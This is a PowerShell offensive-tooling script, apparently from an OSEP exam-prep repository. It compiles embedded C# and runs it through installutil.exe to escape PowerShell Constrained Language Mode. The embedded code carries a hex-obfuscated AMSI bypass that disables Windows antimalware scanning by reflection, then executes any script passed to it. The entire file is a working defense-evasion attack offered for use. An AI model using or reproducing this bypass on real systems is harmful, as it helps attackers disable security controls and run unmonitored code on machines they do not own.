# from https://github.com/tree-chtsec/osep-tools/blob/main/scripts/bypass_clm_installutil.ps1
function Invoke-Installutil{
    $csf = New-TemporaryFile;
    $dllf = New-TemporaryFile;
    Set-Content -Path $csf -Value @'
    using System;
    using System.IO;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Configuration.Install;

    namespace Bypass
    {
        class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine(1+2);
            }
        }

        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                using(Runspace rs = RunspaceFactory.CreateRunspace()) {
                    rs.Open();

                    PowerShell ps = PowerShell.Create();
                    ps.Runspace = rs;

                    ps.AddScript(@"[Ref].Assembly.GetType('Syst'+'em.Manag'+'ement.Automation.'+$('41 6D 73 69 55 74 69 6C 73'.Split(' ')|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($('61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64'.Split(' ')|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true);");
                    foreach (PSObject result in ps.Invoke()) {
                        Console.WriteLine("{0}", result);
                    }

                    ps.AddScript(@"%psraw%");
                    foreach (PSObject result in ps.Invoke()) {
                        Console.WriteLine("{0}", result);
                    }
                    rs.Close();
                }
            }
        }
    }
'@.replace('%psraw%',$args)

    $liba = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).fullname;
    c:\windows\microsoft.net\framework64\v4.0.30319\csc.exe /r:$liba /out:$dllf $csf;
    c:\windows\microsoft.net\framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=true /U $dllf;
};
